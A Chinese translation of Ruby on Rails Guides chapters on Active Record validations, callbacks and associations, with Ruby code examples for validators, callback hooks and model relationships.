如果做验证的类很复杂，必须要用实例变量，可以用纯粹的 Ruby 对象代替：
class Person < ActiveRecord::Base
  validate do |person|
    GoodnessValidator.new(person).validate
  end
end
 
class GoodnessValidator
  def initialize(person)
    @person = person
  end
 
  def validate
    if some_complex_condition_involving_ivars_and_private_methods?
      @person.errors[:base] << "This person is evil"
    end
  end
 
  # ...
end

###  2.13 validates_each

这个帮助方法会把属性值传入代码库做验证，没有预先定义验证的方式，你应该在代码库中定义验证方式。要验证的每个属性都会传入块中做验证。在下面的例子中，我们确保名和姓都不能以小写字母开头：
class Person < ActiveRecord::Base
  validates_each :name, :surname do |record, attr, value|
    record.errors.add(attr, 'must start with upper case') if value =~ /\A[a-z]/
  end
end

代码块的参数是记录，属性名和属性值。在代码块中可以做任何检查，确保数据合法。如果验证失败，要向模型添加一个错误消息，把数据标记为不合法。


##  3 常用的验证选项

常用的验证选项包括：

###  3.1 :allow_nil

指定 :allow_nil 选项后，如果要验证的值为 nil 就会跳过验证。
class Coffee < ActiveRecord::Base
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }, allow_nil: true
end

###  3.2 :allow_blank

:allow_blank 选项和 :allow_nil 选项类似。如果要验证的值为空（调用 blank? 方法，例如 nil 或空字符串），就会跳过验证。
class Topic < ActiveRecord::Base
  validates :title, length: { is: 5 }, allow_blank: true
end
 
Topic.create(title: "").valid?  # => true
Topic.create(title: nil).valid? # => true

###  3.3 :message

前面已经介绍过，如果验证失败，会把 :message 选项指定的字符串添加到 errors 集合中。如果没指定这个选项，Active Record 会使用各种验证帮助方法的默认错误消息。

###  3.4 :on

:on 选项指定什么时候做验证。所有内建的验证帮助方法默认都在保存时（新建记录或更新记录）做验证。如果想修改，可以使用 on: :create，指定只在创建记录时做验证；或者使用 on: :update，指定只在更新记录时做验证。
class Person < ActiveRecord::Base
  # it will be possible to update email with a duplicated value
  validates :email, uniqueness: true, on: :create
 
  # it will be possible to create the record with a non-numerical age
  validates :age, numericality: true, on: :update
 
  # the default (validates on both create and update)
  validates :name, presence: true
end

##  4 严格验证

数据验证还可以使用严格模式，失败后会抛出 ActiveModel::StrictValidationFailed 异常。
class Person < ActiveRecord::Base
  validates :name, presence: { strict: true }
end
 
Person.new.valid?  # => ActiveModel::StrictValidationFailed: Name can't be blank

通过 :strict 选项，还可以指定抛出什么异常：
class Person < ActiveRecord::Base
  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException
end
 
Person.new.valid?  # => TokenGenerationException: Token can't be blank

##  5 条件验证

有时只有满足特定条件时做验证才说得通。条件可通过 :if 和 :unless 选项指定，这两个选项的值可以是 Symbol、字符串、Proc 或数组。:if 选项指定何时做验证。如果要指定何时不做验证，可以使用 :unless 选项。

###  5.1 指定 Symbol

:if 和 :unless 选项的值为 Symbol 时，表示要在验证之前执行对应的方法。这是最常用的设置方法。
class Order < ActiveRecord::Base
  validates :card_number, presence: true, if: :paid_with_card?
 
  def paid_with_card?
    payment_type == "card"
  end
end

###  5.2 指定字符串

:if 和 :unless 选项的值还可以是字符串，但必须是 Ruby 代码，传入 eval 方法中执行。当字符串表示的条件非常短时才应该使用这种形式。
class Person < ActiveRecord::Base
  validates :surname, presence: true, if: "name.nil?"
end

###  5.3 指定 Proc

:if and :unless 选项的值还可以是 Proc。使用 Proc 对象可以在行间编写条件，不用定义额外的方法。这种形式最适合用在一行代码能表示的条件上。
class Account < ActiveRecord::Base
  validates :password, confirmation: true,
    unless: Proc.new { |a| a.password.blank? }
end

###  5.4 条件组合

有时同一个条件会用在多个验证上，这时可以使用 with_options 方法：
class User < ActiveRecord::Base
  with_options if: :is_admin? do |admin|
    admin.validates :password, length: { minimum: 10 }
    admin.validates :email, presence: true
  end
end

with_options 代码块中的所有验证都会使用 if: :is_admin? 这个条件。

###  5.5 联合条件

另一方面，如果是否做某个验证要满足多个条件时，可以使用数组。而且，都一个验证可以同时指定 :if 和 :unless 选项。
class Computer < ActiveRecord::Base
  validates :mouse, presence: true,
                    if: ["market.retail?", :desktop?]
                    unless: Proc.new { |c| c.trackpad.present? }
end

只有当 :if 选项的所有条件都返回 true，且 :unless 选项中的条件返回 false 时才会做验证。

##  6 自定义验证方式

如果内建的数据验证帮助方法无法满足需求时，可以选择自己定义验证使用的类或方法。
###  6.1 自定义验证使用的类

自定义的验证类继承自 ActiveModel::Validator，必须实现 validate 方法，传入的参数是要验证的记录，然后验证这个记录是否合法。自定义的验证类通过 validates_with 方法调用。
class MyValidator < ActiveModel::Validator
  def validate(record)
    unless record.name.starts_with? 'X'
      record.errors[:name] << 'Need a name starting with X please!'
    end
  end
end
 
class Person
  include ActiveModel::Validations
  validates_with MyValidator
end

在自定义的验证类中验证单个属性，最简单的方法是集成 ActiveModel::EachValidator 类。此时，自定义的验证类中要实现 validate_each 方法。这个方法接受三个参数：记录，属性名和属性值。
class EmailValidator < ActiveModel::EachValidator
  def validate_each(record, attribute, value)
    unless value =~ /\A([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\z/i
      record.errors[attribute] << (options[:message] || "is not an email")
    end
  end
end
 
class Person < ActiveRecord::Base
  validates :email, presence: true, email: true
end

如上面的代码所示，可以同时使用内建的验证方法和自定义的验证类。
###  6.2 自定义验证使用的方法

还可以自定义方法验证模型的状态，如果验证失败，向 errors 集合添加错误消息。然后还要使用类方法 validate 注册这些方法，传入自定义验证方法名的 Symbol 形式。

类方法可以接受多个 Symbol，自定义的验证方法会按照注册的顺序执行。
class Invoice < ActiveRecord::Base
  validate :expiration_date_cannot_be_in_the_past,
    :discount_cannot_be_greater_than_total_value
 
  def expiration_date_cannot_be_in_the_past
    if expiration_date.present? && expiration_date < Date.today
      errors.add(:expiration_date, "can't be in the past")
    end
  end
 
  def discount_cannot_be_greater_than_total_value
    if discount > total_value
      errors.add(:discount, "can't be greater than total value")
    end
  end
end

默认情况下，每次调用 valid? 方法时都会执行自定义的验证方法。使用 validate 方法注册自定义验证方法时可以设置 :on 选项，执行什么时候运行。:on 的可选值为 :create 和 :update。
class Invoice < ActiveRecord::Base
  validate :active_customer, on: :create
 
  def active_customer
    errors.add(:customer_id, "is not active") unless customer.active?
  end
end

##  7 处理验证错误

除了前面介绍的 valid? 和 invalid? 方法之外，Rails 还提供了很多方法用来处理 errors 集合，以及查询对象的合法性。

下面介绍其中一些常用的方法。所有可用的方法请查阅 ActiveModel::Errors 的文档。
###  7.1 errors

ActiveModel::Errors 的实例包含所有的错误。其键是每个属性的名字，值是一个数组，包含错误消息字符串。
class Person < ActiveRecord::Base
  validates :name, presence: true, length: { minimum: 3 }
end
 
person = Person.new
person.valid? # => false
person.errors.messages
 # => {:name=>["can't be blank", "is too short (minimum is 3 characters)"]}
 
person = Person.new(name: "John Doe")
person.valid? # => true
person.errors.messages # => {}
###  7.2 errors[]

errors[] 用来获取某个属性上的错误消息，返回结果是一个由该属性所有错误消息字符串组成的数组，每个字符串表示一个错误消息。如果字段上没有错误，则返回空数组。
class Person < ActiveRecord::Base
  validates :name, presence: true, length: { minimum: 3 }
end
 
person = Person.new(name: "John Doe")
person.valid? # => true
person.errors[:name] # => []
 
person = Person.new(name: "JD")
person.valid? # => false
person.errors[:name] # => ["is too short (minimum is 3 characters)"]
 
person = Person.new
person.valid? # => false
person.errors[:name]
 # => ["can't be blank", "is too short (minimum is 3 characters)"]
###  7.3 errors.add

add 方法可以手动添加某属性的错误消息。使用 errors.full_messages 或 errors.to_a 方法会以最终显示给用户的形式显示错误消息。这些错误消息的前面都会加上字段名可读形式（并且首字母大写）。add 方法接受两个参数：错误消息要添加到的字段名和错误消息本身。
class Person < ActiveRecord::Base
  def a_method_used_for_validation_purposes
    errors.add(:name, "cannot contain the characters !@#%*()_-+=")
  end
end
 
person = Person.create(name: "!@#")
 
person.errors[:name]
 # => ["cannot contain the characters !@#%*()_-+="]
 
person.errors.full_messages
 # => ["Name cannot contain the characters !@#%*()_-+="]

还有一种方法可以实现同样地效果，使用 []= 设置方法：
class Person < ActiveRecord::Base
  def a_method_used_for_validation_purposes
    errors[:name] = "cannot contain the characters !@#%*()_-+="
  end
end
 
person = Person.create(name: "!@#")
 
person.errors[:name]
 # => ["cannot contain the characters !@#%*()_-+="]
 
person.errors.to_a
 # => ["Name cannot contain the characters !@#%*()_-+="]
###  7.4 errors[:base]

错误消息可以添加到整个对象上，而不是针对某个属性。如果不想管是哪个属性导致对象不合法，指向把对象标记为不合法状态，就可以使用这个方法。errors[:base] 是个数字，可以添加字符串作为错误消息。
class Person < ActiveRecord::Base
  def a_method_used_for_validation_purposes
    errors[:base] << "This person is invalid because ..."
  end
end
###  7.5 errors.clear

如果想清除 errors 集合中的所有错误消息，可以使用 clear 方法。当然了，在不合法的对象上调用 errors.clear 方法后，这个对象还是不合法的，虽然 errors 集合为空了，但下次调用 valid? 方法，或调用其他把对象存入数据库的方法时， 会再次进行验证。如果任何一个验证失败了，errors 集合中就再次出现值了。
class Person < ActiveRecord::Base
  validates :name, presence: true, length: { minimum: 3 }
end
 
person = Person.new
person.valid? # => false
person.errors[:name]
 # => ["can't be blank", "is too short (minimum is 3 characters)"]
 
person.errors.clear
person.errors.empty? # => true
 
p.save # => false
 
p.errors[:name]
# => ["can't be blank", "is too short (minimum is 3 characters)"]
###  7.6 errors.size

size 方法返回对象上错误消息的总数。
class Person < ActiveRecord::Base
  validates :name, presence: true, length: { minimum: 3 }
end
 
person = Person.new
person.valid? # => false
person.errors.size # => 2
 
person = Person.new(name: "Andrea", email: "andrea@example.com")
person.valid? # => true
person.errors.size # => 0

##  8 在视图中显示验证错误

在模型中加入数据验证后，如果在表单中创建模型，出错时，你或许想把错误消息显示出来。

因为每个程序显示错误消息的方式不同，所以 Rails 没有直接提供用来显示错误消息的视图帮助方法。不过，Rails 提供了这么多方法用来处理验证，自己编写一个也不难。使用脚手架时，Rails 会在生成的 _form.html.erb 中加入一些 ERB 代码，显示模型错误消息的完整列表。

假设有个模型对象存储在实例变量 @post 中，视图的代码可以这么写：
<% if @post.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@post.errors.count, "error") %> prohibited this post from being saved:</h2>
 
    <ul>
    <% @post.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
<% end %>

而且，如果使用 Rails 的表单帮助方法生成表单，如果某个表单字段验证失败，会把字段包含在一个 <div> 中：
<div class="field_with_errors">
 <input id="post_title" name="post[title]" size="30" type="text" value="">
</div>

然后可以根据需求为这个 div 添加样式。脚手架默认添加的 CSS 如下：
.field_with_errors {
  padding: 2px;
  background-color: red;
  display: table;
}

所有出错的表单字段都会放入一个内边距为 2 像素的红色框内。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 回调

本文介绍如何介入 Active Record 对象的生命周期。

读完本文，你将学到：

    Active Record 对象的生命周期；
    如何编写回调方法响应对象声明周期内发生的事件；
    如何把常用的回调封装到特殊的类中；

Chapters

    对象的生命周期
    回调简介
        注册回调
    可用的回调
        创建对象
        更新对象
        销毁对象
        after_initialize 和 after_find
        after_touch
    执行回调
    跳过回调
    终止执行
    关联回调
    条件回调
        使用 Symbol
        使用字符串
        使用 Proc
        回调的多重条件
    回调类
    事务回调

##  1 对象的生命周期

在 Rails 程序运行过程中，对象可以被创建、更新和销毁。Active Record 为对象的生命周期提供了很多钩子，让你控制程序及其数据。

回调可以在对象的状态改变之前或之后触发指定的逻辑操作。
##  2 回调简介

回调是在对象生命周期的特定时刻执行的方法。回调方法可以在 Active Record 对象创建、保存、更新、删除、验证或从数据库中读出时执行。
###  2.1 注册回调

在使用回调之前，要先注册。回调方法的定义和普通的方法一样，然后使用类方法注册：
class User < ActiveRecord::Base
  validates :login, :email, presence: true
 
  before_validation :ensure_login_has_a_value
 
  protected
    def ensure_login_has_a_value
      if login.nil?
        self.login = email unless email.blank?
      end
    end
end

这种类方法还可以接受一个代码块。如果操作可以使用一行代码表述，可以考虑使用代码块形式。
class User < ActiveRecord::Base
  validates :login, :email, presence: true
 
  before_create do
    self.name = login.capitalize if name.blank?
  end
end

注册回调时可以指定只在对象生命周期的特定事件发生时执行：
class User < ActiveRecord::Base
  before_validation :normalize_name, on: :create
 
  # :on takes an array as well
  after_validation :set_location, on: [ :create, :update ]
 
  protected
    def normalize_name
      self.name = self.name.downcase.titleize
    end
 
    def set_location
      self.location = LocationService.query(self)
    end
end

一般情况下，都把回调方法定义为受保护的方法或私有方法。如果定义成公共方法，回调就可以在模型外部调用，违背了对象封装原则。

##  3 可用的回调

下面列出了所有可用的 Active Record 回调，按照执行各操作时触发的顺序：
###  3.1 创建对象

    before_validation
    after_validation
    before_save
    around_save
    before_create
    around_create
    after_create
    after_save

###  3.2 更新对象

    before_validation
    after_validation
    before_save
    around_save
    before_update
    around_update
    after_update
    after_save

###  3.3 销毁对象

    before_destroy
    around_destroy
    after_destroy

创建和更新对象时都会触发 after_save，但不管注册的顺序，总在 after_create 和 after_update 之后执行。
###  3.4 after_initialize 和 after_find

after_initialize 回调在 Active Record 对象初始化时执行，包括直接使用 new 方法初始化和从数据库中读取记录。after_initialize 回调不用直接重定义 Active Record 的 initialize 方法。

after_find 回调在从数据库中读取记录时执行。如果同时注册了 after_find 和 after_initialize 回调，after_find 会先执行。

after_initialize 和 after_find 没有对应的 before_* 回调，但可以像其他回调一样注册。
class User < ActiveRecord::Base
  after_initialize do |user|
    puts "You have initialized an object!"
  end
 
  after_find do |user|
    puts "You have found an object!"
  end
end
 
>> User.new
You have initialized an object!
=> #<User id: nil>
 
>> User.first
You have found an object!
You have initialized an object!
=> #<User id: 1>
###  3.5 after_touch

after_touch 回调在触碰 Active Record 对象时执行。
class User < ActiveRecord::Base
  after_touch do |user|
    puts "You have touched an object"
  end
end
 
>> u = User.create(name: 'Kuldeep')
=> #<User id: 1, name: "Kuldeep", created_at: "2013-11-25 12:17:49", updated_at: "2013-11-25 12:17:49">
 
>> u.touch
You have touched an object
=> true

可以结合 belongs_to 一起使用：
class Employee < ActiveRecord::Base
  belongs_to :company, touch: true
  after_touch do
    puts 'An Employee was touched'
  end
end
 
class Company < ActiveRecord::Base
  has_many :employees
  after_touch :log_when_employees_or_company_touched
 
  private
  def log_when_employees_or_company_touched
    puts 'Employee/Company was touched'
  end
end
 
>> @employee = Employee.last
=> #<Employee id: 1, company_id: 1, created_at: "2013-11-25 17:04:22", updated_at: "2013-11-25 17:05:05">
 
# triggers @employee.company.touch
>> @employee.touch
Employee/Company was touched
An Employee was touched
=> true

##  4 执行回调

下面的方法会触发执行回调：

    create
    create!
    decrement!
    destroy
    destroy!
    destroy_all
    increment!
    save
    save!
    save(validate: false)
    toggle!
    update_attribute
    update
    update!
    valid?

after_find 回调由以下查询方法触发执行：

    all
    first
    find
    find_by
    find_by_*
    find_by_*!
    find_by_sql
    last

after_initialize 回调在新对象初始化时触发执行。

find_by_* 和 find_by_*! 是为每个属性生成的动态查询方法，详情参见“动态查询方法”一节。

##  5 跳过回调

和数据验证一样，回调也可跳过，使用下列方法即可：

    decrement
    decrement_counter
    delete
    delete_all
    increment
    increment_counter
    toggle
    touch
    update_column
    update_columns
    update_all
    update_counters

使用这些方法是要特别留心，因为重要的业务逻辑可能在回调中完成。如果没弄懂回调的作用直接跳过，可能导致数据不合法。

##  6 终止执行

在模型中注册回调后，回调会加入一个执行队列。这个队列中包含模型的数据验证，注册的回调，以及要执行的数据库操作。

整个回调链包含在一个事务中。如果任何一个 before_* 回调方法返回 false 或抛出异常，整个回调链都会终止执行，撤销事务；而 after_* 回调只有抛出异常才能达到相同的效果。

ActiveRecord::Rollback 之外的异常在回调链终止之后，还会由 Rails 再次抛出。抛出 ActiveRecord::Rollback 之外的异常，可能导致不应该抛出异常的方法（例如 save 和 update_attributes，应该返回 true 或 false）无法执行。

##  7 关联回调

回调能在模型关联中使用，甚至可由关联定义。假如一个用户发布了多篇文章，如果用户删除了，他发布的文章也应该删除。下面我们在 Post 模型中注册一个 after_destroy 回调，应用到 User 模型上：
class User < ActiveRecord::Base
  has_many :posts, dependent: :destroy
end
 
class Post < ActiveRecord::Base
  after_destroy :log_destroy_action
 
  def log_destroy_action
    puts 'Post destroyed'
  end
end
 
>> user = User.first
=> #<User id: 1>
>> user.posts.create!
=> #<Post id: 1, user_id: 1>
>> user.destroy
Post destroyed
=> #<User id: 1>

##  8 条件回调

和数据验证类似，也可以在满足指定条件时再调用回调方法。条件通过 :if 和 :unless 选项指定，选项的值可以是 Symbol、字符串、Proc 或数组。:if 选项指定什么时候调用回调。如果要指定何时不调用回调，使用 :unless 选项。

###  8.1 使用 Symbol

:if 和 :unless 选项的值为 Symbol 时，表示要在调用回调之前执行对应的判断方法。使用 :if 选项时，如果判断方法返回 false，就不会调用回调；使用 :unless 选项时，如果判断方法返回 true，就不会调用回调。Symbol 是最常用的设置方式。使用这种方式注册回调时，可以使用多个判断方法检查是否要调用回调。
class Order < ActiveRecord::Base
  before_save :normalize_card_number, if: :paid_with_card?
end

###  8.2 使用字符串

:if 和 :unless 选项的值还可以是字符串，但必须是 RUby 代码，传入 eval 方法中执行。当字符串表示的条件非常短时才应该是使用这种形式。
class Order < ActiveRecord::Base
  before_save :normalize_card_number, if: "paid_with_card?"
end
###  8.3 使用 Proc

:if 和 :unless 选项的值还可以是 Proc 对象。这种形式最适合用在一行代码能表示的条件上。
class Order < ActiveRecord::Base
  before_save :normalize_card_number,
    if: Proc.new { |order| order.paid_with_card? }
end
###  8.4 回调的多重条件

注册条件回调时，可以同时使用 :if 和 :unless 选项：
class Comment < ActiveRecord::Base
  after_create :send_email_to_author, if: :author_wants_emails?,
    unless: Proc.new { |comment| comment.post.ignore_comments? }
end

##  9 回调类

有时回调方法可以在其他模型中重用，我们可以将其封装在类中。

在下面这个例子中，我们为 PictureFile 模型定义了一个 after_destroy 回调：
class PictureFileCallbacks
  def after_destroy(picture_file)
    if File.exist?(picture_file.filepath)
      File.delete(picture_file.filepath)
    end
  end
end

在类中定义回调方法时（如上），可把模型对象作为参数传入。然后可以在模型中使用这个回调：
class PictureFile < ActiveRecord::Base
  after_destroy PictureFileCallbacks.new
end

注意，因为回调方法被定义成实例方法，所以要实例化 PictureFileCallbacks。如果回调要使用实例化对象的状态，使用这种定义方式很有用。不过，一般情况下，定义为类方法更说得通：
class PictureFileCallbacks
  def self.after_destroy(picture_file)
    if File.exist?(picture_file.filepath)
      File.delete(picture_file.filepath)
    end
  end
end

如果按照这种方式定义回调方法，就不用实例化 PictureFileCallbacks：
class PictureFile < ActiveRecord::Base
  after_destroy PictureFileCallbacks
end

在回调类中可以定义任意数量的回调方法。

##  10 事务回调

还有两个回调会在数据库事务完成时触发：after_commit 和 after_rollback。这两个回调和 after_save 很像，只不过在数据库操作提交或回滚之前不会执行。如果模型要和数据库事务之外的系统交互，就可以使用这两个回调。

例如，在前面的例子中，PictureFile 模型中的记录删除后，还要删除相应的文件。如果执行 after_destroy 回调之后程序抛出了异常，事务就会回滚，文件会被删除，但模型的状态前后不一致。假设在下面的代码中，picture_file_2 是不合法的，那么调用 save! 方法会抛出异常。
PictureFile.transaction do
  picture_file_1.destroy
  picture_file_2.save!
end

使用 after_commit 回调可以解决这个问题。
class PictureFile < ActiveRecord::Base
  after_commit :delete_picture_file_from_disk, on: [:destroy]
 
  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end

:on 选项指定什么时候出发回调。如果不设置 :on 选项，每各个操作都会触发回调。

after_commit 和 after_rollback 回调确保模型的创建、更新和销毁等操作在事务中完成。如果这两个回调抛出了异常，会被忽略，因此不会干扰其他回调。因此，如果回调可能抛出异常，就要做适当的补救和处理。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 关联

本文介绍 Active Record 中的关联功能。

读完本文，你将学到：

    如何声明 Active Record 模型间的关联；
    怎么理解不同的 Active Record 关联类型；
    如何使用关联添加的方法；

Chapters

    为什么要使用关联
    关联的类型
        belongs_to 关联
        has_one 关联
        has_many 关联
        has_many :through 关联
        has_one :through 关联
        has_and_belongs_to_many 关联
        使用 belongs_to 还是 has_one
        使用 has_many :through 还是 has_and_belongs_to_many
        多态关联
        自连接
    小技巧和注意事项
        缓存控制
        避免命名冲突
        更新模式
        控制关联的作用域
        双向关联
    关联详解
        belongs_to 关联详解
        has_one 关联详解
        has_many 关联详解
        has_and_belongs_to_many 关联详解
        关联回调
        关联扩展

##  1 为什么要使用关联

模型之间为什么要有关联？因为关联让常规操作更简单。例如，在一个简单的 Rails 程序中，有一个顾客模型和一个订单模型。每个顾客可以下多个订单。没用关联的模型定义如下：
class Customer < ActiveRecord::Base
end
 
class Order < ActiveRecord::Base
end

假如我们要为一个顾客添加一个订单，得这么做：
@order = Order.create(order_date: Time.now, customer_id: @customer.id)

或者说要删除一个顾客，确保他的所有订单都会被删除，得这么做：
@orders = Order.where(customer_id: @customer.id)
@orders.each do |order|
  order.destroy
end
@customer.destroy

使用 Active Record 关联，告诉 Rails 这两个模型是有一定联系的，就可以把这些操作连在一起。下面使用关联重新定义顾客和订单模型：
class Customer < ActiveRecord::Base
  has_many :orders, dependent: :destroy
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
end

这么修改之后，为某个顾客添加新订单就变得简单了：
@order = @customer.orders.create(order_date: Time.now)

删除顾客及其所有订单更容易：
@customer.destroy

学习更多关联类型，请阅读下一节。下一节介绍了一些使用关联时的小技巧，然后列出了关联添加的所有方法和选项。
##  2 关联的类型

在 Rails 中，关联是两个 Active Record 模型之间的关系。关联使用宏的方式实现，用声明的形式为模型添加功能。例如，声明一个模型属于（belongs_to）另一个模型后，Rails 会维护两个模型之间的“主键-外键”关系，而且还向模型中添加了很多实用的方法。Rails 支持六种关联：

    belongs_to
    has_one
    has_many
    has_many :through
    has_one :through
    has_and_belongs_to_many

在后面的几节中，你会学到如何声明并使用这些关联。首先来看一下各种关联适用的场景。
###  2.1 belongs_to 关联

belongs_to 关联创建两个模型之间一对一的关系，声明所在的模型实例属于另一个模型的实例。例如，如果程序中有顾客和订单两个模型，每个订单只能指定给一个顾客，就要这么声明订单模型：
class Order < ActiveRecord::Base
  belongs_to :customer
end

belongs_to 关联

在 belongs_to 关联声明中必须使用单数形式。如果在上面的代码中使用复数形式，程序会报错，提示未初始化常量 Order::Customers。因为 Rails 自动使用关联中的名字引用类名。如果关联中的名字错误的使用复数，引用的类也就变成了复数。

相应的迁移如下：
class CreateOrders < ActiveRecord::Migration
  def change
    create_table :customers do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :orders do |t|
      t.belongs_to :customer
      t.datetime :order_date
      t.timestamps
    end
  end
end
###  2.2 has_one 关联

has_one 关联也会建立两个模型之间的一对一关系，但语义和结果有点不一样。这种关联表示模型的实例包含或拥有另一个模型的实例。例如，在程序中，每个供应商只有一个账户，可以这么定义供应商模型：
class Supplier < ActiveRecord::Base
  has_one :account
end

has_one 关联

相应的迁移如下：
class CreateSuppliers < ActiveRecord::Migration
  def change
    create_table :suppliers do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :accounts do |t|
      t.belongs_to :supplier
      t.string :account_number
      t.timestamps
    end
  end
end
###  2.3 has_many 关联

has_many 关联建立两个模型之间的一对多关系。在 belongs_to 关联的另一端经常会使用这个关联。has_many 关联表示模型的实例有零个或多个另一个模型的实例。例如，在程序中有顾客和订单两个模型，顾客模型可以这么定义：
class Customer < ActiveRecord::Base
  has_many :orders
end

声明 has_many 关联时，另一个模型使用复数形式。

has_many 关联

相应的迁移如下：
class CreateCustomers < ActiveRecord::Migration
  def change
    create_table :customers do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :orders do |t|
      t.belongs_to :customer
      t.datetime :order_date
      t.timestamps
    end
  end
end
###  2.4 has_many :through 关联

has_many :through 关联经常用来建立两个模型之间的多对多关联。这种关联表示一个模型的实例可以借由第三个模型，拥有零个和多个另一个模型的实例。例如，在看病过程中，病人要和医生预约时间。这中间的关联声明如下：
class Physician < ActiveRecord::Base
  has_many :appointments
  has_many :patients, through: :appointments
end
 
class Appointment < ActiveRecord::Base
  belongs_to :physician
  belongs_to :patient
end
 
class Patient < ActiveRecord::Base
  has_many :appointments
  has_many :physicians, through: :appointments
end

has_many :through 关联

相应的迁移如下：
class CreateAppointments < ActiveRecord::Migration
  def change
    create_table :physicians do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :patients do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :appointments do |t|
      t.belongs_to :physician
      t.belongs_to :patient
      t.datetime :appointment_date
      t.timestamps
    end
  end
end

连接模型中的集合可以使用 API 关联。例如：
physician.patients = patients

会为新建立的关联对象创建连接模型实例，如果其中一个对象删除了，相应的记录也会删除。

自动删除连接模型的操作直接执行，不会触发 *_destroy 回调。

has_many :through 还可用来简化嵌套的 has_many 关联。例如，一个文档分为多个部分，每一部分又有多个段落，如果想使用简单的方式获取文档中的所有段落，可以这么做：
class Document < ActiveRecord::Base
  has_many :sections
  has_many :paragraphs, through: :sections
end
 
class Section < ActiveRecord::Base
  belongs_to :document
  has_many :paragraphs
end
 
class Paragraph < ActiveRecord::Base
  belongs_to :section
end

加上 through: :sections 后，Rails 就能理解这段代码：
@document.paragraphs
###  2.5 has_one :through 关联

has_one :through 关联建立两个模型之间的一对一关系。这种关联表示一个模型通过第三个模型拥有另一个模型的实例。例如，每个供应商只有一个账户，而且每个账户都有一个历史账户，那么可以这么定义模型：
class Supplier < ActiveRecord::Base
  has_one :account
  has_one :account_history, through: :account
end
 
class Account < ActiveRecord::Base
  belongs_to :supplier
  has_one :account_history
end
 
class AccountHistory < ActiveRecord::Base
  belongs_to :account
end

has_one :through 关联

相应的迁移如下：
class CreateAccountHistories < ActiveRecord::Migration
  def change
    create_table :suppliers do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :accounts do |t|
      t.belongs_to :supplier
      t.string :account_number
      t.timestamps
    end
 
    create_table :account_histories do |t|
      t.belongs_to :account
      t.integer :credit_rating
      t.timestamps
    end
  end
end
###  2.6 has_and_belongs_to_many 关联

has_and_belongs_to_many 关联之间建立两个模型之间的多对多关系，不借由第三个模型。例如，程序中有装配体和零件两个模型，每个装配体中有多个零件，每个零件又可用于多个装配体，这时可以按照下面的方式定义模型：
class Assembly < ActiveRecord::Base
  has_and_belongs_to_many :parts
end
 
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
end

has_and_belongs_to_many 关联

相应的迁移如下：
class CreateAssembliesAndParts < ActiveRecord::Migration
  def change
    create_table :assemblies do |t|
      t.string :name
      t.timestamps
    end
 
    create_table :parts do |t|
      t.string :part_number
      t.timestamps
    end
 
    create_table :assemblies_parts, id: false do |t|
      t.belongs_to :assembly
      t.belongs_to :part
    end
  end
end
###  2.7 使用 belongs_to 还是 has_one

如果想建立两个模型之间的一对一关系，可以在一个模型中声明 belongs_to，然后在另一模型中声明 has_one。但是怎么知道在哪个模型中声明哪种关联？

不同的声明方式带来的区别是外键放在哪个模型对应的数据表中（外键在声明 belongs_to 关联所在模型对应的数据表中）。不过声明时要考虑一下语义，has_one 的意思是某样东西属于我。例如，说供应商有一个账户，比账户拥有供应商更合理，所以正确的关联应该这么声明：
class Supplier < ActiveRecord::Base
  has_one :account
end
 
class Account < ActiveRecord::Base
  belongs_to :supplier
end

相应的迁移如下：
class CreateSuppliers < ActiveRecord::Migration
  def change
    create_table :suppliers do |t|
      t.string  :name
      t.timestamps
    end
 
    create_table :accounts do |t|
      t.integer :supplier_id
      t.string  :account_number
      t.timestamps
    end
  end
end

t.integer :supplier_id 更明确的表明了外键的名字。在目前的 Rails 版本中，可以抽象实现的细节，使用 t.references :supplier 代替。
###  2.8 使用 has_many :through 还是 has_and_belongs_to_many

Rails 提供了两种建立模型之间多对多关系的方法。其中比较简单的是 has_and_belongs_to_many，可以直接建立关联：
class Assembly < ActiveRecord::Base
  has_and_belongs_to_many :parts
end
 
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
end

第二种方法是使用 has_many :through，但无法直接建立关联，要通过第三个模型：
class Assembly < ActiveRecord::Base
  has_many :manifests
  has_many :parts, through: :manifests
end
 
class Manifest < ActiveRecord::Base
  belongs_to :assembly
  belongs_to :part
end
 
class Part < ActiveRecord::Base
  has_many :manifests
  has_many :assemblies, through: :manifests
end

根据经验，如果关联的第三个模型要作为独立实体使用，要用 has_many :through 关联；如果不需要使用第三个模型，用简单的 has_and_belongs_to_many 关联即可（不过要记得在数据库中创建连接数据表）。

